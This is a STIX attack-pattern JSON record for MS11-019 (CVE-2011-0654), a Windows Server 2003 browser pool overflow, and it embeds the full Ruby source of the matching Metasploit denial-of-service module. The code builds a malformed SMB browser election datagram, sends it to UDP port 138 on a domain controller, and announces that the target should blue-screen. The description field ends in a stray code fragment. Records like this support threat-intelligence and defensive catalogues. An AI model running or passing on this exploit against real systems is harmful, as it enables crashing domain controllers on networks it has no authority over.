{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9f7ccfcd-b12f-4d4a-8f93-559233cc4803",
    "created": "2024-08-14T16:25:33.809813Z",
    "modified": "2024-08-14T16:25:33.809816Z",
    "name": "Microsoft Windows Browser Pool DoS",
    "description": " This module exploits a denial of service flaw in the Microsoft Windows SMB service on versions of Windows Server 2003 that have been configured as a domain controller. By sending a specially crafted election request, an attacker can cause a pool overflow.  The vulnerability appears to be due to an error handling a length value while calculating the amount of memory to copy to a buffer. When there are zero bytes left in the buffer, the length value is improperly decremented and an integer underflow occurs. The resulting value is used in several calculations and is then passed as the length value to an inline memcpy operation.  Unfortunately, the length value appears to be fixed at -2 (0xfffffffe) and causes considerable damage to kernel heap memory. While theoretically possible it does not appear to be trivial to turn this vulnerability into remote (or even local) code execution.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/ms11_019_electbowser.rb",
            "external_id": "ms11_019_electbowser.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2011/Feb/285"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  #include Msf::Exploit::Remote::SMB::Client\n  include Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Windows Browser Pool DoS',\n      'Description'    => %q{\n          This module exploits a denial of service flaw in the Microsoft\n        Windows SMB service on versions of Windows Server 2003 that have been\n        configured as a domain controller. By sending a specially crafted election\n        request, an attacker can cause a pool overflow.\n\n        The vulnerability appears to be due to an error handling a length value\n        while calculating the amount of memory to copy to a buffer. When there are\n        zero bytes left in the buffer, the length value is improperly decremented\n        and an integer underflow occurs. The resulting value is used in several\n        calculations and is then passed as the length value to an inline memcpy\n        operation.\n\n        Unfortunately, the length value appears to be fixed at -2 (0xfffffffe) and\n        causes considerable damage to kernel heap memory. While theoretically possible,\n        it does not appear to be trivial to turn this vulnerability into remote (or\n        even local) code execution.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2011-0654' ],\n          [ 'BID', '46360' ],\n          [ 'OSVDB', '70881' ],\n          [ 'MSB', 'MS11-019' ],\n          [ 'EDB', '16166' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2011/Feb/285' ]\n        ],\n      'Author'         => [ 'Cupidon-3005', 'jduck' ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(138),\n        OptString.new('DOMAIN', [ true, \"The name of the domain that the target controls\" ])\n      ])\n  end\n\n\n  def run\n\n    connect_udp\n    @client = Rex::Proto::SMB::Client.new(udp_sock)\n\n    ip = Rex::Socket.source_address(datastore['RHOST'])\n    ip_src = Rex::Socket.resolv_nbo(ip, false)\n\n    svc_src = \"\\x41\\x41\\x00\"   # pre-encoded?\n    name_src = Rex::Text.rand_text_alphanumeric(15) # 4+rand(10))\n\n    svc_dst = \"\\x42\\x4f\\x00\"   # pre-encoded?\n    name_dst = datastore['DOMAIN']\n\n    pipe = \"\\\\MAILSLOT\\\\BROWSER\"\n\n    election =\n      \"\\x08\" +              # Election Request\n      \"\\x09\" +              # Election Version\n      \"\\xa8\" +              # election desire - Domain Master & WINS & NT\n      \"\\x0f\" +              # Browser Protocol Major Version\n      \"\\x01\" +              # Browser Protocol Minor Version\n      \"\\x20\" +              # Election OS (NT Server)\n      \"\\x1b\\xe9\\xa5\\x00\" +  # Uptime\n      \"\\x00\\x00\\x00\\x00\" +  # NULL... Padding?\n      #(\"A\" * 4) + \"\\x00\"\n      Rex::Text.rand_text_alphanumeric(410) + \"\\x00\"\n\n    nbdghdr =\n      \"\\x11\" +              # DIRECT_GROUP datagram\n      \"\\x02\" +              # first and only fragment\n      [rand(0xffff)].pack('n') +  # Transation Id (DGM_ID)\n      ip_src +\n      \"\\x00\\x8a\" +          # Source Port (138)\n      \"\\x00\\xa7\" +          # DGM_LENGTH, patched in after\n      \"\\x00\\x00\"            # PACKET_OFFSET\n\n    nbdgs = nbdghdr +\n      half_ascii(name_src, svc_src) +\n      half_ascii(name_dst, svc_dst)\n\n    # A Trans request for the mailslot\n    nbdgs << trans_mailslot(pipe, '', election)\n\n    # Patch up the length (less the nb header)\n    nbdgs[0x0a, 2] = [nbdgs.length - nbdghdr.length].pack('n')\n\n    print_status(\"Sending specially crafted browser election request..\")\n    #print_status(\"\\n\" + Rex::Text.to_hex_dump(nbdgs))\n    udp_sock.put(nbdgs)\n\n    print_status(\"The target should encounter a blue screen error now.\")\n\n    disconnect_udp\n\n  end\n\n\n  # Perform a browser election request using the specified subcommand, parameters, and data\n  def trans_mailslot(pipe, param = '', body = '')\n\n    # Null-terminate the pipe parameter if needed\n    if (pipe[-1,1] != \"\\x00\")\n      pipe << \"\\x00\"\n    end\n\n    pkt = Rex::Proto::SMB::Constants::SMB_TRANS_PKT.make_struct\n    @client.smb_defaults(pkt['Payload']['SMB'])\n\n    setup_count = 3\n    setup_data = [1, 0, 2].pack('v*')\n\n    data = pipe + param + body\n\n    base_offset = pkt.to_s.length + (setup_count * 2) - 4\n    param_offset = base_offset + pipe.length\n    data_offset = param_offset + param.length\n\n    pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_TRANSACTION\n    pkt['Payload']['SMB'].v['Flags1'] = 0x0\n    pkt['Payload']['SMB'].v['Flags2'] = 0x0\n    pkt['Payload']['SMB'].v['WordCount'] = 14 + setup_count\n\n    pkt['Payload'].v['ParamCountTotal'] = param.length\n    pkt['Payload'].v['DataCountTotal'] = data.length\n    pkt['Payload'].v['ParamCountMax'] = 0\n    pkt['Payload'].v['DataCountMax'] = 0\n\n    pkt['Payload'].v['ParamCount'] = param.length\n    pkt['Payload'].v['ParamOffset'] = param_offset if param.length > 0\n    pkt['Payload'].v['DataCount'] = body.length\n    pkt['Payload'].v['DataOffset'] = data_offset\n    pkt['Payload'].v['SetupCount'] = setup_count\n    pkt['Payload'].v['SetupData'] = setup_data\n\n    pkt['Payload'].v['Payload'] = data\n\n    exploit = pkt.to_s\n\n    # Strip off the netbios header (thx, but no thx!)\n    exploit[4, exploit.length - 4]\n  end\n\n\n  def half_ascii(name, svc)\n    ret = \" \"\n    name.unpack('C*').each { |byte|\n      ret << [0x41 + (byte >> 4)].pack('C')\n      ret << [0x41 + (byte & 0xf)].pack('C')\n    }\n    left = 15 - name.length\n    if left > 0\n      ret << \"\\x43\\x41\" * left\n    end\n\n    # In our case, svc is already encoded..\n    ret << svc\n    ret\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Cupidon-3005",
        "jduck ]",
        ""
    ]
}